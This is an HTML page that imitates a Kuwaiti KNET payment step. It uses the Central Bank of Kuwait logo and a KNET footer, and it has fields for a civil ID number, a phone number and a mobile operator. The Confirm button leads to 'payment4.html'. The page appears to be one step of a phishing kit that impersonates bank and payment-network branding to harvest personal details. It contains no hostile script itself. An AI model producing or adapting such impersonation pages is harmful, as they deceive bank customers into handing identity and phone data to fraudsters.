<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>...</title>
    <!-- Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap"
      rel="stylesheet"
    />
    <!-- Tailwind -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
      body {
        font-family: "Cairo", sans-serif;
      }
    </style>
  </head>
  
  <body class="bg-white">
    <main class="w-full md:w-[600px] mx-auto p-4">
      <div
        class="rounded-es-xl rounded-se-xl bg-sky-100 p-2 overflow-hidden shadow-md"
      >
        <img
          src="https://www.cbk.gov.kw/ar/images/cbk-logo_tcm11-126503.svg"
          class="mx-auto w-50 lg:w-70"
        />
      </div>

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div>
          <img
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiP7GMAYmbc-9nRlyNOHltlBIWzdvCo8bLoQ&s"
            class="mx-auto w-20"
          />
        </div>

        <div class="mt-3">
          <div class="flex items-center py-1 border-b-2 text-sm">
            <h3 class="w-2/5 text-sky-600 font-bold">Merchant:</h3>
            <p class="w-3/5">TBAFCI</p>
          </div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <h3 class="w-2/5 text-sky-600 font-bold">Amount:</h3>
            <p class="w-3/5">KD 3.5.000</p>
          </div>
        </div>
      </section>

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold">Civil number:</label>
            <div class="w-3/5">
              <input
                type="text"
                class="w-full border-2 border-sky-600 outline-0 rounded p-1"
              />
            </div>
          </div>

          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold">Phone number:</label>
            <div class="w-3/5">
              <input
                type="text"
                class="w-full border-2 border-sky-600 outline-0 rounded p-1"
              />
            </div>
          </div>

          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold"
              >Network operator:</label
            >
            <div class="w-3/5">
              <select
                class="w-full bg-gray-200 rounded-full outline-0 cursor-pointer"
              >
                <option>Network operator:</option>
                <option>Saudi Telecom Company</option>
                <option>Zain</option>
                <option>Ooredoo</option>
              </select>
            </div>
          </div>
        </div>
      </section>

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div class="flex justify-center items-center text-sm">
          <a
            href="payment4.html"
            class="w-1/2 text-center bg-gray-200 text-gray-500 font-bold p-1 rounded border border-gray-500"
          >
            Confirm
          </a>
        </div>
      </section>

      <footer class="text-center mx-auto text-sm">
        <p>All Rights Reserved. Copyright 2024 Â©</p>
        <p class="text-sky-600 font-bold">
          The Shared Electronic Banking Services Company - KNET
        </p>
      </footer>
    </main>
  </body>
</html>
